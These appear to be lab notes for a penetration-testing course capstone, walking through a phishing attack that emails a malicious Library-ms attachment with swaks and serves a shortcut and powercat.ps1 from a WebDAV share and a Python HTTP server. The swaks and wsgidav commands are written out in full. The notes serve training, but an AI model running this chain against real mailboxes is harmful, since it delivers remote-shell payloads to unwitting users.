---
IP_KALI: 192.168.45.155
IP_TARGET: 192.168.202.199
USER: dave.wizard@supermagicorg.com
DOMAIN: dave.wizard@supermagicorg.com
SENDER: test@supermagicorg.com
---
- sudo swaks -t <span id="USER"/>dave.wizard@supermagicorg.com<span type="end"/> --from test@supermagicorg.com --attach @config.Library-ms --server 192.168.202.199 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
- sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com --attach @config.Library-ms --server 192.168.202.199 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

Walkthrough
**STEP II - Wsgidav + Python3 HTTP Server + Swaks attack **

*Capstones are meant to be done after you are done with the training material and you bounce back to sharpen your skills with this type of exercise called capstones!  Swaks is learned in module 24, so if you want to do the capstone observe carefully the videos regarding Swaks - 25.3.2. Phishing for Access *

Follow the exact steps as **Kali user (not root)** to install `wsgidav`

1. After you create the **webdav** folder at `/home/kali/webdav` and copy-pasted both files in the same folder like I showed upper, make sure you add **powercat.ps1 **there, including a new file named **body.txt** (content can be anything)
**NOTE: **You should have by now 4 files there : `automatic_configuration.lnk` , `config.Library-ms`, `powercat.ps1` and `body.txt` 

2. Make sure to open `wsgidav sharing the webdav folder where you have the files  ```/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/```  
**NOTE:** Do a test on your Kali Browser and go to http://tun0_IP ! If you see the wsgidav server you are good until here! 

3. In the same folder webdav , open `Python3 HTTP Server` (to be safer I usually recommend opening the folder, right-click on it, and open terminal )  
```python3 -m http.server 8000```
 **NOTE:** Wsgidav is hosted on port 80 and Python3 HTTP Server is opened on port 8000! 

4. Swaks attack (as shown in 25.3.2 Pishing for Access) 
```sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap```

**Do the command in the same folder where you have all 4 files, meaning in this location -> /home/kali/webdav (else it fails to attach config.Library-ms and body.txt when you execute it!)**